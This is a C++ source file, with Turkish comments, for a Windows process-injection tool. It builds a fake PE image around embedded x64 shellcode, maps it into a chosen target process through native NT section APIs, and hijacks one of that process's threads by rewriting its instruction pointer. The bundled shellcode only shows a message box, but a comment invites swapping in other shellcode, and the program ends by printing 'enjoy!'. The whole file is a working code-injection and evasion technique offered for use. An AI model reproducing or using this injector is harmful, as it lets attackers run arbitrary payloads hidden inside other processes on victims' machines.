
#include "pentium.h"


// SHELL CODE BURAYA GELCEK ORNEK OLARAK MESSAGE BOX VE EXITPROC KULLANDIM
unsigned char shellcode[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
SIZE_T shellcode_size = sizeof(shellcode) - 1;

NativeApis apileriyukle() {
    NativeApis apis = { 0 };
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        apis.NtCreateSection = (pNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
        apis.NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
        apis.NtUnmap = (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
        apis.NtSuspend = (pNtSuspendThread)GetProcAddress(ntdll, "NtSuspendThread");
        apis.NtGetContext = (pNtGetContextThread)GetProcAddress(ntdll, "NtGetContextThread");
        apis.NtSetContext = (pNtSetContextThread)GetProcAddress(ntdll, "NtSetContextThread");
        apis.NtResume = (pNtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
    }
    return apis;
}

DWORD pidd(const wchar_t* pn) {
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pE;
        pE.dwSize = sizeof(pE);
        if (Process32FirstW(hSnap, &pE)) {
            do {
                if (!_wcsicmp(pE.szExeFile, pn)) {
                    procId = pE.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnap, &pE));
        }
        CloseHandle(hSnap);
    }
    return procId;
}

HANDLE threadial(NativeApis& apis, DWORD pid) {
    HANDLE hThread = NULL;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 tE;
        tE.dwSize = sizeof(tE);
        if (Thread32First(hSnap, &tE)) {
            do {
                if (tE.th32OwnerProcessID == pid) {
                    hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, tE.th32ThreadID);
                    if (hThread != NULL) break;
                }
            } while (Thread32Next(hSnap, &tE));
        }
        CloseHandle(hSnap);
    }
    return hThread;
}

void Fakepeolustur(unsigned char* buffer, SIZE_T buffer_size, const unsigned char* sc, SIZE_T sc_size) {
    memset(buffer, 0, buffer_size);

    *(WORD*)buffer = 0x5A4D;
    *(DWORD*)(buffer + 0x3C) = PE_OFFSET;

    *(DWORD*)(buffer + PE_OFFSET) = 0x00004550;

    DWORD offset = PE_OFFSET + 4;
    *(WORD*)(buffer + offset) = 0x8664;
    offset += 2;
    *(WORD*)(buffer + offset) = 1;
    offset += 2;
    *(DWORD*)(buffer + offset) = (DWORD)(GetTickCount64() & 0xFFFFFFFFUL);
    offset += 4;
    *(DWORD*)(buffer + offset) = 0;
    offset += 4;
    *(DWORD*)(buffer + offset) = 0;
    offset += 4;
    *(WORD*)(buffer + offset) = OPT_HEADER_SIZE;
    offset += 2;
    *(WORD*)(buffer + offset) = 0x010F;

    offset = PE_OFFSET + 24;
    *(WORD*)(buffer + offset) = 0x20B;
    offset += 2;
    *(BYTE*)(buffer + offset) = 14;
    offset += 1;
    *(BYTE*)(buffer + offset) = 31;
    offset += 1;
    DWORD section_virtual_size = IMAGE_SIZE - SECTION_VA;
    *(DWORD*)(buffer + offset) = section_virtual_size;
    offset += 4;
    *(DWORD*)(buffer + offset) = 0;
    offset += 4;
    *(DWORD*)(buffer + offset) = 0;
    offset += 4;
    *(DWORD*)(buffer + offset) = ENTRY_RVA;
    offset += 4;
    *(DWORD*)(buffer + offset) = SECTION_VA;
    offset += 4;

    *(ULONGLONG*)(buffer + offset) = 0;
    offset += 8;

    *(DWORD*)(buffer + offset) = 0x1000;
    offset += 4;
    *(DWORD*)(buffer + offset) = 0x200;
    offset += 4;
    *(WORD*)(buffer + offset) = 6;
    offset += 2;
    *(WORD*)(buffer + offset) = 0;
    offset += 2;
    *(WORD*)(buffer + offset) = 0;
    offset += 2;
    *(WORD*)(buffer + offset) = 0;
    offset += 2;
    *(WORD*)(buffer + offset) = 6;
    offset += 2;
    *(WORD*)(buffer + offset) = 0;
    offset += 2;
    *(DWORD*)(buffer + offset) = 0;
    offset += 4;
    *(DWORD*)(buffer + offset) = IMAGE_SIZE;
    offset += 4;
    *(DWORD*)(buffer + offset) = SIZE_OF_HEADERS;
    offset += 4;
    *(DWORD*)(buffer + offset) = 0;
    offset += 4;
    *(WORD*)(buffer + offset) = 3;
    offset += 2;
    *(WORD*)(buffer + offset) = 0x140;
    offset += 2;
    *(ULONGLONG*)(buffer + offset) = 0x400000;
    offset += 8;
    *(ULONGLONG*)(buffer + offset) = 0x1000;
    offset += 8;
    *(ULONGLONG*)(buffer + offset) = 0x100000;
    offset += 8;
    *(ULONGLONG*)(buffer + offset) = 0x1000;
    offset += 8;
    *(DWORD*)(buffer + offset) = 0;
    offset += 4;
    *(DWORD*)(buffer + offset) = 16;
    offset += 4;

    memset(buffer + offset, 0, 16 * 8);
    offset += 16 * 8;

    DWORD section_offset = SECTION_TABLE_OFFSET;
    char* section_name = (char*)(buffer + section_offset);
    memcpy(section_name, ".text", 5);
    section_name[5] = 0;
    section_offset += 8;
    *(DWORD*)(buffer + section_offset) = section_virtual_size;
    section_offset += 4;
    *(DWORD*)(buffer + section_offset) = SECTION_VA;
    section_offset += 4;
    *(DWORD*)(buffer + section_offset) = section_virtual_size;
    section_offset += 4;
    *(DWORD*)(buffer + section_offset) = SECTION_RAW_OFFSET;
    section_offset += 4;
    *(DWORD*)(buffer + section_offset) = 0;
    section_offset += 4;
    *(DWORD*)(buffer + section_offset) = 0;
    section_offset += 4;
    *(WORD*)(buffer + section_offset) = 0;
    section_offset += 2;
    *(WORD*)(buffer + section_offset) = 0;
    section_offset += 2;
    *(DWORD*)(buffer + section_offset) = 0x60000020;

    memcpy(buffer + SECTION_RAW_OFFSET + (ENTRY_RVA - SECTION_VA), sc, sc_size);
}

int wmain(int argc, wchar_t* argv[]) {
    NativeApis apis = apileriyukle();
    if (!apis.NtCreateSection || !apis.NtMapViewOfSection || !apis.NtUnmap ||
        !apis.NtSuspend || !apis.NtGetContext || !apis.NtSetContext ||
        !apis.NtResume) {
        wprintf(L"apiler yuklenemedi\n");
        return -1;
    }
    const wchar_t* target_pn = (argc > 1) ? argv[1] : L"prot2.exe";
    DWORD pid = pidd(target_pn);
    if (!pid) {
        wprintf(L"Process not found: %s\n", target_pn);
        return -1;
    }
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        return -1;
    }
    unsigned char local_buffer[IMAGE_SIZE];
    Fakepeolustur(local_buffer, IMAGE_SIZE, shellcode, shellcode_size);
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    wcscat_s(tempPath, MAX_PATH, L"yarraminbasi.tmp");
    HANDLE hFile = CreateFileW(tempPath, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return -1;
    }
    DWORD written = 0;
    if (!WriteFile(hFile, local_buffer, IMAGE_SIZE, &written, NULL) || written != IMAGE_SIZE) {
        wprintf(L"WriteFile failed: %d\n", GetLastError());
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return -1;
    }
    FlushFileBuffers(hFile);
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize;
    maxSize.QuadPart = IMAGE_SIZE;
    NTSTATUS status = apis.NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READ, SEC_IMAGE, hFile);
    CloseHandle(hFile);
    if (!NT_SUCCESS(status)) {
        wprintf(L"NtCreateSection failed: 0x%08X\n", status);
        CloseHandle(hProcess);
        return -1;
    }
    PVOID remotebase = NULL;
    SIZE_T view_size = IMAGE_SIZE;
    status = apis.NtMapViewOfSection(hSection, hProcess, &remotebase, 0, 0, NULL, &view_size, ViewUnmap, 0, PAGE_EXECUTE_READ);
    CloseHandle(hSection);
    if (!NT_SUCCESS(status)) {
        wprintf(L"NtMapViewOfSection failed: 0x%08X\n", status);
        CloseHandle(hProcess);
        return -1;
    }
    HANDLE hThread = threadial(apis, pid);
    if (!hThread) {
        apis.NtUnmap(hProcess, remotebase);
        CloseHandle(hProcess);
        return -1;
    }
    ULONG suspend_count = 0;
    status = apis.NtSuspend(hThread, &suspend_count);
    if (!NT_SUCCESS(status)) {
        CloseHandle(hThread);
        apis.NtUnmap(hProcess, remotebase);
        CloseHandle(hProcess);
        return -1;
    }
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    status = apis.NtGetContext(hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        apis.NtResume(hThread, NULL);
        CloseHandle(hThread);
        apis.NtUnmap(hProcess, remotebase);
        CloseHandle(hProcess);
        return -1;
    }
    ctx.Rip = (DWORD64)remotebase + ENTRY_RVA;
    status = apis.NtSetContext(hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        apis.NtResume(hThread, NULL);
        CloseHandle(hThread);
        apis.NtUnmap(hProcess, remotebase);
        CloseHandle(hProcess);
        return -1;
    }
    status = apis.NtResume(hThread, &suspend_count);
    if (!NT_SUCCESS(status)) {
        CloseHandle(hThread);
        apis.NtUnmap(hProcess, remotebase);
        CloseHandle(hProcess);
        return -1;
    }
    Sleep(2000);
    CloseHandle(hThread);
    apis.NtUnmap(hProcess, remotebase);
    CloseHandle(hProcess);
    wprintf(L"Shell code injected for %s (PID: %d) enjoy!\n", target_pn, pid);
    return 0;
}